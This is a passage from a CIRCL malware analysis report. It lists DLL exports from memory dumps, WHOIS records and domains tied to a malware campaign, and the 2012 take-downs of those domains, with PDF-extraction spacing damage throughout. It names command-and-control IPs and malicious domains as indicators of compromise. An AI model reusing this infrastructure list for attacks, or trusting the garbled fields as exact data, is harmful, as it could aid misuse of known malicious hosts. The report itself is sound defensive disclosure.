4 0 . 00008 C1C C a l l E n d i n g
4 1 . 00007551 I n p r o c S e r v e r 3 2 F r o m S t r i n g
4 2 . 0 0 0 0 6 2 B8 CancelUnimodemTimer
4 3 . 0 0 0 0 5 6 C4 S e t A c t i o n N a m e
4 4 . 0 0 0 0 5 2 6 9 FreeUnimodemTimer
4 5 . 0 0 0 0 4 0 E1 S e t A c t i o n L o g F i l e
4 6 . 00007 E53 G e t C a t a l o g O b j e c t

2. dump_00E30000.bin
Flags

: 00000000

Time stamp

: Tue Mar 13 2 0 : 3 2 : 4 6 2012

Version

:

DLL name

:

client . dll

:

1.

(00000001)

Addresses :

1.

(00000001)

1.

(00000001)

Ordinals
# of

base

# o f Names

:

0.0

1 . 00001872 C r e a t e P r o c e s s N o t i f y

E.

Involved hosts and AS numbers

• wednesltr.com.tw (122.155.165.122)
inetnum :

122.155.160.0

122.155.191.255

netname :

CAT IDC2 S e r v i c e

descr :

CAT IDC2 14 t h f l o o r

country :

TH

admin c :

SC1450 AP

tech c :

CS416 AP

status :

ALLOCATED NON PORTABLE

remarks :

⇤⇤⇤ s e n d spam a b u s e t o s u p p o r t @ i d c . c a t t e l e c o m . com⇤⇤⇤

notify :
mnt by :

s u p p o r t @ i d c . c a t t e l e c o m . com

MAINT TH THIX CAT

mnt l o w e r :

MAINT TH THIX CAT

mnt r o u t e s :

MAINT TH THIX CAT

mnt i r t :

IRT CAT TH

changed :

s u c h o k @ c a t . n e t . t h 20110112

source :

APNIC

person :

s u p p o r t CAT IDC

nic

SC1450 AP

hdl :

e mail :

s u p p o r t @ i d c . c a t t e l e c o m . com

address :

CAT IDC Data Comm . Dept . ( IDC )

address :

CAT Telecom P u b l i c Company Ltd ,

address :

72 C h a r o e n k r u n g Road Bangrak Bangkok THAILAND 10501

address :

23

phone :

+66 2 6141240 3

f a x no :

+66 2 6142270

country :

TH

changed :

s u c h o k @ b u l b u l . c a t . n e t . t h 20070719

mnt by :

MAINT NEW

source :

APNIC

person :

CAT IDC Spamming t r a c k i n g team

nic

CS416 AP

hdl :

e mail :
address :

a b u s e @ i d c . c a t t e l e c o m . com
I n t e r n e t d a t a c e n t e r d e p a r t m e n t CAT Tower f l o o r 13
72 c h a r e n k r u n g Rd . Bangrak

phone :

Bangkok

+66 210 41240

f a x no :

+66 210 41244

country :

TH

changed :

s u c h o k @ b u l b u l . c a t . n e t . t h 20091211

mnt by :

MAINT NEW

source :

APNIC

• masmitnd.com.tw (64.62.146.101)
NetRange :

64.62.128.0

CIDR :

64.62.128.0/17

OriginAS :

AS6939

NetName :

HURRICANE 4

64.62.255.255

NetHandle :

NET 64 62 128 0 1

Parent :

NET 64 0 0 0 0

NetType :

Direct Allocation

Comment :

ADDRESSES WITHIN THIS BLOCK ARE NON PORTABLE

RegDate :

2002 08 27

Updated :

2012 02 24

Ref :

h t t p : / / w h o i s . a r i n . n e t / r e s t / n e t /NET 64 62 128 0 1

OrgName :

Hurricane Electric , Inc .

OrgId :

HURC

Address :

760 M i s s i o n C o u r t

City :

Fremont

StateProv :

CA

PostalCode :

94539

Country :

US

RegDate :
Updated :

2011 04 13

Ref :

h t t p : / / w h o i s . a r i n . n e t / r e s t / o r g /HURC

R e f e r r a l S e r v e r : r w h o i s : / / r w h o i s . he . n e t : 4 3 2 1
OrgTechHandle :

ZH17 ARIN

OrgTechName :

Hurricane E l e c t r i c

OrgTechPhone :

+1 510 580 4100

OrgTechEmail :

hostmaster@he . net

24

OrgTechRef :

h t t p : / / w h o i s . a r i n . n e t / r e s t / poc /ZH17 ARIN

OrgAbuseHandle : ABUSE1036 ARIN
OrgAbuseName :

Abuse Department

OrgAbusePhone :

+1 510 580 4100

OrgAbuseEmail :

abuse@he . n e t

OrgAbuseRef :

h t t p : / / w h o i s . a r i n . n e t / r e s t / poc /ABUSE1036 ARIN

RTechHandle :

ZH17 ARIN

RTechName :

Hurricane E l e c t r i c

RTechPhone :

+1 510 580 4100

RTechEmail :

hostmaster@he . net

RTechRef :

h t t p : / / w h o i s . a r i n . n e t / r e s t / poc /ZH17 ARIN

RNOCHandle :

ZH17 ARIN

RNOCName :

Hurricane E l e c t r i c

RNOCPhone :

+1 510 580 4100

RNOCEmail :

hostmaster@he . net

RNOCRef :

h t t p : / / w h o i s . a r i n . n e t / r e s t / poc /ZH17 ARIN

RAbuseHandle :

ABUSE1036 ARIN

RAbuseName :

Abuse Department

RAbusePhone :

+1 510 580 4100

RAbuseEmail :

abuse@he . n e t

RAbuseRef :

h t t p : / / w h o i s . a r i n . n e t / r e s t / poc /ABUSE1036 ARIN

• financepfrro.com.tw (195.191.56.240)
inetnum :

195.191.56.0

netname :

A l t N e t UA

195.191.57.255

descr :

PE K o l o b o v A l e k s a n d r G r i g o r i e v i c h

country :

UA

remarks :

#############################################

remarks :

###

P o i n t s o f c o n t a c t f o r One Host H o s t i n g C e n t e r

remarks :

###

SPAM : a b u s e @ o n e h o s t . com . ua

remarks :

###

Network s e c u r i t y

remarks :

###

Customer s u p p o r t : s u p p o r t @ o n e h o s t . com . ua

remarks :

#############################################

org :

i s s u e s : n o c @ o n e h o s t . com . ua

ORG IKAG2 RIPE

admin c :

VMK19 RIPE

tech c :

VMK19 RIPE

status :

ASSIGNED P I

mnt by :

RIPE NCC END MNT

mnt l o w e r :

RIPE NCC END MNT

mnt by :

AS50395 MNT

mnt r o u t e s :

AS50395 MNT

mnt d o m a i n s :

AS50395 MNT

source :

RIPE # F i l t e r e d

organisation :

ORG IKAG2 RIPE

org name :

IP Kolobov A l e k s a n d r G r i g o r i e v i c h

25

org t y p e :
other address :

5 uy K o t e l y n i c h e s k i y

mnt r e f :

NETASSIST MNT

mnt by :

NETASSIST MNT

source :

RIPE # F i l t e r e d

a l l e y 1 2 , o f . 14

person :

V a s i l i y M Kamenskiy

address :

u l . P r o s p e r t Mira , 47

phone :

+7 495 7832213

nic

VMK19 RIPE

hdl :

mnt by :

AS50395 MNT

source :

RIPE # F i l t e r e d

% I n f o r m a t i o n r e l a t e d to

’ 1 9 5 . 1 9 1 . 5 6 . 0 / 2 3 AS50395 ’

route :

195.191.56.0/23

descr :

PPoE Network

origin :

AS50395

mnt by :

AS50395 MNT

source :

RIPE # F i l t e r e d

• 200.46.204.8
inetnum :

200.46.204.0/25

status :

reallocated

owner :

HUB . ORG

ownerid :

PA HUBO1 LACNIC

r e s p o n s i b l e : Marc G . F o u r n i e r
address :

360 Main S t r e e t , S u i t e 2 1 , 3 6 0 ,

address :

11111

country :

PA

phone :

+902 542 0713 [ ]

owner c :

MGF

tech c :

MGF

abuse c :

MGF

created :

20040129

Panama

changed :

20040129

inetnum up :

200.46.192/20

nic

MGF

hdl :

person :

Marc G . F o u r n i e r

e mail :

scrappy@HUB . ORG

address :

360 Main S t r e e t , S u i t e 2 1 , 3 6 0 ,

address :

B4P1C4

country :

CA

phone :

+1 902 542 0713 [ ]

created :

20031010

changed :

20031010

Wolfville

NS

• 95.143.198.47
26

inetnum :

95.143.198.1

95.143.198.254

netname :

serverconnect

cloud network

descr :
Abuse m a i l b o x : a b u s e @ s e r v e r c o n n e c t . s e
country :

se

admin c :

PF4155 RIPE

tech c :

PF4155 RIPE

status :

ASSIGNED PA

mnt by :

MNT SERVERCONNECT

source :

RIPE # F i l t e r e d

person :

Peter Forslund

address :

Hyggesvagen 1

phone :

+46 650484444

nic

PF4155 RIPE

hdl :

source :

RIPE # F i l t e r e d

% I n f o r m a t i o n r e l a t e d to

’ 9 5 . 1 4 3 . 1 9 2 . 0 / 2 0 AS49770 ’

route :

95.143.192.0/20

descr :

S e r v a i n e t BLK

origin :

AS49770

mnt by :

MNT SERVERCONNECT

source :

RIPE # F i l t e r e d

F.

Related domain information

These domains have been identified being registered using the same email address
’aster@gmail.com’. With a high probability, these are used with malicious intention.
46.102.232.171

m a s e r l u k . com . tw .

TTL 600

46.102.232.171

p u z i l l o . com . tw .

TTL 600

46.102.232.171

q u a n i t e r . com . tw .

TTL 600

46.102.232.171

q v a z g l a s . com . tw .

TTL 600

64.62.146.100

a s t e r o n e w . com . tw .

TTL 600

64.62.146.101

as forum . com . tw .

TTL 600

64.62.146.101

h o t m a k i n g . com . tw .

TTL 600

64.62.146.101

MASMITND .COM.TW.

TTL 600

66.197.144.38

VKRMEK.COM.TW.

TTL 600

79.137.214.18

ABC FORUM.COM.TW.

TTL 600

79.137.214.18

o b e r o n 3 2 3 . com . tw .

TTL 600

79.137.214.18

OREON3 .COM.TW.

TTL 600

79.137.214.18

properdom . com . tw .

TTL 600

79.137.214.18

v n u e s s 3 . com . tw .

TTL 600

89.201.174.51

gubkabob . com . tw .

TTL 600

91.211.88.39

p r e o n . com . tw .

TTL 600

91.215.218.79

g u a r d a l a r m s . com .

TTL 600

91.215.218.79

shambabu . com . tw .

TTL 600

27

1 2 2 . 1 5 5 . 1 6 5 . 1 2 2 w e d n e s l t r . com . tw .

TTL 600

188.247.135.77

NEWLIFEN .COM.TW.

TTL 600

188.247.135.77

WEHAVECHANSE .COM.TW.

TTL 600

194.219.29.152

metdoman . com .

TTL 600

195.191.56.240

f i n a n c e p f r r o . com . tw .

TTL 600

195.191.56.240

man forum . com . tw .

TTL 600

195.191.56.240

m a s t e r m i . com . tw .

TTL 600

195.191.56.240

MASTERMI .COM.TW.

TTL 600

195.191.56.240

m a s t e r o f o r . com . tw .

TTL 600

195.191.56.240

membran . com . tw .

TTL 600

203.150.230.31

c l o s u r e s o c k s . com .

TTL 600

204.93.171.237

DIGMETACPAN .COM.TW.

TTL 600

204.93.171.237

newgetp . com . tw .

TTL 600

204.93.171.246

g o o d l o k i . com . tw .

TTL 600

212.36.9.52

a p o c a l p . com . tw .

TTL 600

G.

Take-down

Based on a previous version of this report, CIRCL in collaboration with various registrars
and/or hosters was able to take-down all the identified domains and several IP addresses. Taking
down IP addresses or the associated computers unfortunately took much more time and the
process is now completed as with the release date of this version of the report.

1. Registered domains

CIRCL asked on July 27 2012 for the take-down of the ’.com.tw’ and ’.com’ domains. All
’.com.tw’ domains were suspended on August 08 2012. The ’.com’ domains were suspended on
August 16 2012

2. IP addresses

Several of the IP addresses are no longer active, for instance the two hardcoded IP addresses
(200.46.204.8, 95.143.198.47), but quite a few still are or are active again. Fortunately, the
examined malware mainly relies on DNS (except for the two hardcoded IP addresses)
and the hardcoded IP addresses are no longer reachable.

28